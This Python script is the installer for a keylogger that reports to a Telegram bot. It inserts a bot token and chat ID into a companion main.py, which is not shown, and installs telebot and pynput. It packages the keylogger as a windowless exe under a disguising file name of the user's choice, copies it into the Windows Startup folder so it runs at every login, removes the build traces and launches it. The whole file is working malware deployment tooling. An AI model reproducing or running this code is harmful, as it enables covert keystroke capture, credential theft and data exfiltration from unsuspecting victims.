import getpass
import os
import shutil

def install():
    code = []
    with open('main.py') as file:
        while True:
            line = file.readline()
            if not line:
                break
            code.append(line)

    path = f'C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

    token = input('Input tgbot token\n>>')
    chatid = input('Input chatID\n>>')
    fakename = input('Input exe file name\n>>')
    if fakename == '':
        fakename = 'main'

    code[7] = f"token = '{token}'\n"
    code[8] = f"chatID = '{chatid}'\n"
    
    with open('main.py', 'w+') as file:
        for line in code:
            file.write(line)
    
    print('\nInstalling dependencies...\n')
    os.system('pip install telebot pynput pyinstaller')

    print('\nConverting file to exe...\n')
    os.system('pyinstaller --noconfirm --onefile --windowed --icon "icon.ico"  "main.py"')
    
    print('\nChanging file name...\n')
    os.rename('dist/main.exe', f'{fakename}.exe')

    print('\nAdding file to autoload...\n')
    os.rename(f'{fakename}.exe', f'{path}/{fakename}.exe')

    print('\nClearing installation folder...\n')
    os.remove('main.spec')
    os.rmdir('dist')
    shutil.rmtree('build')

    print('\nStarting the keylogger...\n')
    os.system(f'{path}/{fakename}.exe')

    a = input('\nKeylogger installed successfully! :D\nPress enter to continue.')

if __name__ == '__main__':
    install()